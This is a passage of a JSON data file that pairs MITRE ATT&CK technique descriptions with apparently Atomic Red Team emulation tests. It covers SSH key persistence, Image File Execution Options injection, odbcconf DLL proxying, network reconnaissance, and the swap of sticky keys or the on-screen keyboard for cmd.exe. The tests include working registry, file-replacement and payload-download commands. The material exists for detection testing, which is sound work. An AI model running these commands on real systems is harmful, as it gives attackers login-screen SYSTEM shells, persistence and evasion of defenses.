account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) \n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)", "atomic_tests": [{"name": "Modify SSH Authorized Keys", "auto_generated_guid": "342cc723-127c-4d3a-8292-9c0c6b4ecadc", "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "elevation_required": false, "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;\n", "cleanup_command": "unset ssh_authorized_keys\n"}}]}, "T1546.012": {"name": "Image File Execution Options Injection", "technique_id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6", "external_id": "T1546.012", "data_components": ["Windows Registry Key Modification", "Command Execution", "Process Creation"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)", "atomic_tests": [{"name": "IFEO Add Debugger", "auto_generated_guid": "fdda2626-5234-4c90-b163-60849a24c0b8", "description": "Leverage Global Flags Settings\n", "supported_platforms": ["windows"], "input_arguments": {"target_binary": {"description": "Binary To Attach To", "type": "path", "default": "calc.exe"}, "payload_binary": {"description": "Binary To Execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n", "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "IFEO Global Flags", "auto_generated_guid": "46b1f278-c8ee-4aa5-acce-65e77b11f3c1", "description": "Leverage Global Flags Settings\n", "supported_platforms": ["windows"], "input_arguments": {"target_binary": {"description": "Binary To Attach To", "type": "path", "default": "notepad.exe"}, "payload_binary": {"description": "Binary To Execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "GlobalFlags in Image File Execution Options", "auto_generated_guid": "13117939-c9b2-4a43-999e-0a543df92f0d", "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n", "supported_platforms": ["windows"], "input_arguments": {"process": {"description": "Process to monitor\n", "type": "string", "default": "whoami.exe"}, "cmd_to_run": {"description": "Command to execute\n", "type": "string", "default": "cmd.exe /c calc.exe"}}, "executor": {"command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n", "cleanup_command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n", "name": "powershell", "elevation_required": true}}]}, "T1218.008": {"name": "Odbcconf", "technique_id": "attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071", "external_id": "T1218.008", "data_components": ["Command Execution", "Process Creation", "Module Load"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n", "atomic_tests": [{"name": "Odbcconf.exe - Execute Arbitrary DLL", "auto_generated_guid": "2430498b-06c0-4b92-a448-8ad263c388e2", "description": "Execute arbitrary DLL file stored locally.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n", "name": "command_prompt"}}, {"name": "Odbcconf.exe - Load Response File", "auto_generated_guid": "331ce274-f9c9-440b-9f8c-a1006e1fce0b", "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n", "supported_platforms": ["windows"], "input_arguments": {"rsp_file_name": {"description": "Response file name to load", "type": "string", "default": "T1218.008.rsp"}, "rsp_file_path": {"description": "Response file path", "type": "string", "default": "PathToAtomicsFolder\\T1218.008\\bin\\"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n", "prereq_command": "if (Test-Path \"#{rsp_file_path}#{rsp_file_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp\" -OutFile \"#{rsp_file_path}#{rsp_file_name}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll\" -OutFile \"#{rsp_file_path}\\o.dll\"\n"}], "executor": {"command": "cd \"#{rsp_file_path}\"\nodbcconf.exe -f \"#{rsp_file_name}\"\n", "name": "command_prompt"}}]}, "T1125": {"name": "Video Capture", "technique_id": "attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf", "external_id": "T1125", "data_components": ["Command Execution", "OS API Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)", "atomic_tests": [{"name": "Registry artefact when application use webcam", "auto_generated_guid": "6581e4a7-42e3-43c5-a0d2-5a0d62f9702a", "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "cleanup_command": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /f\n", "name": "command_prompt"}}]}, "T1016": {"name": "System Network Configuration Discovery", "technique_id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0", "external_id": "T1016", "data_components": ["OS API Execution", "Command Execution", "Process Creation", "Script Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ", "atomic_tests": [{"name": "System Network Configuration Discovery on Windows", "auto_generated_guid": "970ab6a1-0157-4f3f-9a73-ec4166754b23", "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n", "name": "command_prompt"}}, {"name": "List Windows Firewall Rules", "auto_generated_guid": "038263cb-00f4-4b0a-98ae-0696c67e1752", "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "netsh advfirewall firewall show rule name=all\n", "name": "command_prompt"}}, {"name": "System Network Configuration Discovery", "auto_generated_guid": "c141bbdb-7fca-4254-9fd6-f47e79447e17", "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n", "supported_platforms": ["macos", "linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if arp command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)\n"}], "executor": {"command": "if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n", "name": "sh"}}, {"name": "System Network Configuration Discovery (freebsd)", "auto_generated_guid": "7625b978-4efd-47de-8744-add270374bee", "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n", "supported_platforms": ["linux"], "executor": {"command": "if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then netstat -Sp tcp | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n", "name": "sh"}}, {"name": "System Network Configuration Discovery (TrickBot Style)", "auto_generated_guid": "dafaf052-5508-402d-bf77-51e0700c02e2", "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "name": "command_prompt"}}, {"name": "List Open Egress Ports", "auto_generated_guid": "4b467538-f102-491d-ace7-ed487b853bf5", "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path of file to write port scan results", "type": "path", "default": "$env:USERPROFILE\\Desktop\\open-ports.txt"}, "portfile_url": {"description": "URL to top-128.txt", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt"}, "port_file": {"description": "The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap.", "type": "path", "default": "PathToAtomicsFolder\\T1016\\src\\top-128.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Test requires #{port_file} to exist\n", "prereq_command": "if (Test-Path \"#{port_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{port_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{portfile_url}\" -OutFile \"#{port_file}\"\n"}], "executor": {"command": "$ports = Get-content \"#{port_file}\"\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "cleanup_command": "Remove-Item -ErrorAction ignore \"#{output_file}\"\n", "name": "powershell"}}, {"name": "Adfind - Enumerate Active Directory Subnet Objects", "auto_generated_guid": "9bb45dd7-c466-4f93-83a1-be30e56033ee", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet)\n", "name": "command_prompt"}}, {"name": "Qakbot Recon", "auto_generated_guid": "121de5c6-5818-4868-b8a7-8fd07c455c1b", "description": "A list of commands known to be performed by Qakbot for recon purposes", "supported_platforms": ["windows"], "input_arguments": {"recon_commands": {"description": "File that houses list of commands to be executed", "type": "path", "default": "PathToAtomicsFolder\\T1016\\src\\qakbot.bat"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "File to copy must exist on disk at specified location (#{recon_commands})\n", "prereq_command": "if (Test-Path \"#{recon_commands}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{recon_commands}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat\" -OutFile \"#{recon_commands}\"\n"}], "executor": {"command": "\"#{recon_commands}\"\n", "name": "command_prompt"}}, {"name": "List macOS Firewall Rules", "auto_generated_guid": "ff1d8c25-2aa4-4f18-a425-fede4a41ee88", "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n", "supported_platforms": ["macos"], "executor": {"command": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n", "name": "bash", "elevation_required": true}}, {"name": "DNS Server Discovery Using nslookup", "auto_generated_guid": "34557863-344a-468f-808b-a1bfb89b4fa9", "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n", "supported_platforms": ["windows"], "executor": {"command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%\n", "name": "command_prompt"}}]}, "T1546.008": {"name": "Accessibility Features", "technique_id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5", "external_id": "T1546.008", "data_components": ["File Modification", "Windows Registry Key Modification", "Command Execution", "File Creation", "Process Creation"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>", "atomic_tests": [{"name": "Attaches Command Prompt as a Debugger to a List of Target Processes", "auto_generated_guid": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9", "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n", "supported_platforms": ["windows"], "input_arguments": {"parent_list": {"description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n", "type": "string", "default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"}, "attached_process": {"description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n", "type": "path", "default": "C:\\windows\\system32\\cmd.exe"}}, "executor": {"command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}\n", "name": "powershell", "elevation_required": true}}, {"name": "Replace binary of sticky keys", "auto_generated_guid": "934e90cf-29ca-48b3-863c-411737ad44e3", "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n", "supported_platforms": ["windows"], "executor": {"command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n", "cleanup_command": "copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Create Symbolic Link From osk.exe to cmd.exe", "auto_generated_guid": "51ef369c-5e87-4f33-88cd-6d61be63edf2", "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n", "supported_platforms": ["windows"], "executor": {"command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n", "cleanup_command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n", "name": "command_prompt", "elevation_required": true}}]}, "T1562.006": {"name": "Indicator Blocking", "technique_id": "attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da", "external_id": "T1562.006", "data_components": ["Command Execution", "Windows Registry Key Modification", "Host Status"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": 